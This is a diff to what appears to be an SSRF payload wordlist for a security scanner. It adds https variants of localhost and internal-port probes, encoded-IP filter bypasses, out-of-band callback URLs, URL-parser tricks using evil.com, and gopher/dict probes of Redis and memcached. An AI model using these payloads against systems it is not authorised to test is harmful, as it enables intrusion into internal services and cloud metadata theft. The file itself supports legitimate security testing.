@@ -3,27 +3,42 @@
 http://[invalid
 http://
 http:///
+https://[invalid
+https://
+https:///
 file://
 gopher://
 http://127.0.0.1:1
+https://127.0.0.1:1
 http://127.0.0.1:0
 http://localhost:99999
+https://localhost:99999
 http://[::]:1
+https://[::]:1
 ftp://127.0.0.1:1
 http://127.0.0.1:22
+https://127.0.0.1:22
 http://0.0.0.0:1
+https://0.0.0.0:1
 dict://127.0.0.1:11211/INFO
 ldap://127.0.0.1:389
 
 ##SSRF - Math-Based##
 
 http://127.0.0.1:1337
+https://127.0.0.1:1337
 http://localhost:1337
+https://localhost:1337
 http://127.0.0.1:7331
+https://127.0.0.1:7331
 http://0.0.0.0:1337
+https://0.0.0.0:1337
 http://[::1]:1337
+https://[::1]:1337
 http://2130706433:1337
+https://2130706433:1337
 http://0x7f000001:1337
+https://0x7f000001:1337
 
 ##SSRF - Timing-Based##
 
@@ -45,12 +60,17 @@ http://10.255.255.1:9999/timeout
 ##SSRF - OOB##
 
 https://{domain}/ssrf
+http://{domain}/ssrf
 http://{domain}:8080/ssrf
+https://{domain}:8443/ssrf
 http://{domain}:443/ssrf
+https://{domain}:443/ssrf
 //{domain}/ssrf
 \\{domain}\ssrf
 http://{domain}%23@127.0.0.1
+https://{domain}%23@127.0.0.1
 http://foo.{domain}/ssrf
+https://foo.{domain}/ssrf
 gopher://{domain}:70/_test
 ftp://{domain}/ssrf
 dict://{domain}:11211/INFO
@@ -85,25 +105,38 @@ http://169.254.169.254/v1/metadata
 ##SSRF - IP Bypass##
 
 http://2130706433/
+https://2130706433/
 http://0x7f000001/
+https://0x7f000001/
 http://0177.0.0.1/
+https://0177.0.0.1/
 http://0x7f.0x0.0x0.0x1/
 http://017700000001/
 http://0177.0000.0000.0001/
 http://127.1/
+https://127.1/
 http://127.0.1/
 http://0/
 http://0.0.0.0/
+https://0.0.0.0/
 http://[::1]/
+https://[::1]/
 http://[::ffff:127.0.0.1]/
+https://[::ffff:127.0.0.1]/
 http://[0:0:0:0:0:ffff:127.0.0.1]/
 http://[::1]:80/
+https://[::1]:443/
 http://[::ffff:7f00:1]/
 http://127.0.0.1.nip.io/
+https://127.0.0.1.nip.io/
 http://spoofed.burpcollaborator.net/
+https://spoofed.burpcollaborator.net/
 http://localtest.me/
+https://localtest.me/
 http://127.127.127.127/
+https://127.127.127.127/
 http://0x7f000001.nip.io/
+https://0x7f000001.nip.io/
 
 ##SSRF - Protocol Schemes##
 
@@ -126,22 +159,28 @@ ldap://127.0.0.1:389/%0astats%0aquit
 ##SSRF - URL Tricks##
 
 http://evil@127.0.0.1/
+https://evil@127.0.0.1/
 http://127.0.0.1#@evil.com
 http://evil.com@127.0.0.1/
+https://evil.com@127.0.0.1/
 http://127.0.0.1?@evil.com/
 http://evil.com%0d%0a%0d%0aGET%20/internal
 http://127.0.0.1/..;/..;/admin
+https://127.0.0.1/..;/..;/admin
 http://127.1.1.1:80\@127.2.2.2:80/
 http://127.0.0.1\t@evil.com/
 
 ##SSRF - DNS Rebinding##
 http://1337.oob.{domain}/
+https://1337.oob.{domain}/
 ##SSRF - Open Redirect Chain##
 http://localhost/redirect?url=http://{domain}/ssrf
+https://localhost/redirect?url=https://{domain}/ssrf
 ##SSRF - Internal Service Probe (Redis)##
 gopher://127.0.0.1:6379/_INFO%0d%0a
 ##SSRF - Internal Service Probe (Elasticsearch)##
 http://127.0.0.1:9200/_cluster/health
+https://127.0.0.1:9200/_cluster/health
 ##SSRF - IPv6 Zone ID Bypass##
 http://[::1%25eth0]/
 ##SSRF - URL Parsing Bug (backslash)##
